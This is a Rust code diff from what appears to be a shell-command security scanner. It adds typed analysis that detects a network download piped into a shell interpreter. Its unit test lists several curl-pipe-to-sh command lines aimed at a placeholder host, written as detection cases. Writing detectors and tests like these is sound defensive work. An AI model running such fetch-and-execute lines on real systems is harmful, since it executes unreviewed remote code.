@@ -7,13 +7,16 @@
 use super::budget::ShellBudget;
 use super::command::{segment_commands, skip_command_prefixes, statement_outcomes};
 use super::effects::{
-    body_live_fetch_stdout, command_decodes, command_fetches, pipeline_has_live_producer,
-    segment_has_live_producer, segment_stdin_reaches_interpreter, stdout_reaches,
+    EgressEffect, StdoutEffect, body_live_fetch_stdout, command_decodes, command_fetches,
+    ir_command_effects, ir_node_reaches_interpreter, ir_node_stdout_preserved,
+    pipeline_has_live_producer, segment_has_live_producer, segment_stdin_reaches_interpreter,
+    stdout_reaches,
 };
 use super::indicators::{
     chmod_relaxes_shared_temp, reverse_shell_spelling, segment_has_shared_temp_path,
 };
 use super::interpreter::{INTERPRETER_BASENAMES, static_command_body};
+use super::ir::{CommandNode, LogicalUnit};
 use super::lexer::{ShellToken, SubstKind, tokenize};
 use super::syntax::{
     GroupKind, Outcomes, conditional_statements, grouped_token_ranges, pipeline_segments,
@@ -30,6 +33,7 @@ use crate::fingerprint::Confidence;
 /// statements on the line add no information.
 pub(in crate::detect) fn shell_consumption_findings(
     tokens: &[ShellToken],
+    shell_unit: Option<&LogicalUnit>,
     number: u32,
     download_rule: &'static str,
     found: &mut Vec<ResultParts>,
@@ -37,6 +41,20 @@ pub(in crate::detect) fn shell_consumption_findings(
 ) {
     if !budget.spend(tokens.len()) {
         return;
+    }
+    // The typed path owns direct command and compound reachability. The token
+    // walk below remains for substitutions, static bodies, and unsupported
+    // nested text that has not yet become child IR.
+    if shell_unit.is_some_and(|unit| typed_fetch_reaches_interpreter(unit, budget)) {
+        push_finding(
+            found,
+            parts(
+                download_rule,
+                number,
+                "download-execute",
+                Confidence::LexicalFallback,
+            ),
+        );
     }
     let mut outcomes = Outcomes::ANY;
     for (statement, guard) in conditional_statements(tokens) {
@@ -154,7 +172,14 @@ pub(in crate::detect) fn shell_consumption_findings(
                 if !budget.enter() {
                     return;
                 }
-                shell_consumption_findings(&tokenize(&body), number, download_rule, found, budget);
+                shell_consumption_findings(
+                    &tokenize(&body),
+                    None,
+                    number,
+                    download_rule,
+                    found,
+                    budget,
+                );
                 budget.leave();
             }
         }
@@ -169,7 +194,14 @@ pub(in crate::detect) fn shell_consumption_findings(
             match kind {
                 GroupKind::List => {
                     if budget.enter() {
-                        shell_consumption_findings(group, number, download_rule, found, budget);
+                        shell_consumption_findings(
+                            group,
+                            None,
+                            number,
+                            download_rule,
+                            found,
+                            budget,
+                        );
                         budget.leave();
                     }
                 }
@@ -205,6 +237,7 @@ pub(in crate::detect) fn shell_consumption_findings(
                                 }
                                 shell_consumption_findings(
                                     &tokenize(&substitution.inner),
+                                    None,
                                     number,
                                     download_rule,
                                     found,
@@ -228,6 +261,49 @@ pub(in crate::detect) fn shell_consumption_findings(
 
         outcomes = outcomes.advance(guard, statement_outcomes(statement));
     }
+}
+
+/// Direct fetch-to-interpreter pairing over the typed shell IR. Only direct
+/// command nodes are claimed here; compound producers and re-parsed bodies
+/// stay on the bounded token fallback until their child programs are stored
+/// in the IR.
+fn typed_fetch_reaches_interpreter(unit: &LogicalUnit, budget: &mut ShellBudget) -> bool {
+    unit.statements
+        .iter()
+        .filter(|statement| statement.reachable)
+        .flat_map(|statement| statement.pipelines.iter())
+        .any(|pipeline| typed_pipeline_fetch_reaches_interpreter(pipeline, budget))
+}
+
+fn typed_pipeline_fetch_reaches_interpreter(
+    pipeline: &super::ir::Pipeline,
+    budget: &mut ShellBudget,
+) -> bool {
+    for consumer in 1..pipeline.commands.len() {
+        if !ir_node_reaches_interpreter(&pipeline.commands[consumer], budget) {
+            continue;
+        }
+        for producer in 0..consumer {
+            if !typed_node_has_live_fetch(&pipeline.commands[producer], budget) {
+                continue;
+            }
+            if pipeline.commands[producer + 1..consumer]
+                .iter()
+                .all(|node| ir_node_stdout_preserved(node, budget))
+            {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+fn typed_node_has_live_fetch(node: &CommandNode, budget: &mut ShellBudget) -> bool {
+    let CommandNode::Simple(command) = node else {
+        return false;
+    };
+    let effects = ir_command_effects(command, budget);
+    effects.egress == EgressEffect::NetworkFetch && effects.stdout != StdoutEffect::Redirected
 }
 
 /// Consumption families inside an arithmetic expansion: the expression's
@@ -270,6 +346,7 @@ fn tokens_arithmetic_consumption(
                         if budget.enter() {
                             shell_consumption_findings(
                                 &tokenize(&substitution.inner),
+                                None,
                                 number,
                                 download_rule,
                                 found,
@@ -415,4 +492,36 @@ fn span_executes_decoder(span: &str, budget: &mut ShellBudget) -> bool {
         outcomes = outcomes.advance(guard, statement_outcomes(statement));
     }
     false
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::detect::shell::ir::ShellProgram;
+
+    #[test]
+    fn typed_fetch_consumers_honor_guards_compounds_and_redirects() {
+        let cases = [
+            ("curl https://example.test/live | sh", true),
+            ("curl https://example.test/live | sh -n", false),
+            ("curl https://example.test/live | (echo safe; sh)", true),
+            ("curl https://example.test/live | (false && sh)", false),
+            (
+                "curl https://example.test/live | (cat >/dev/null; sh)",
+                false,
+            ),
+            ("curl https://example.test/live >body | sh", false),
+        ];
+
+        for (source, expected) in cases {
+            let program = ShellProgram::from_units(vec![(1, source.to_owned())]);
+            let mut budget = ShellBudget::new();
+            assert_eq!(
+                typed_fetch_reaches_interpreter(&program.units()[0], &mut budget),
+                expected,
+                "typed fetch-consumer result for {source:?}"
+            );
+            assert!(!budget.exhausted(), "typed walk exhausted for {source:?}");
+        }
+    }
 }
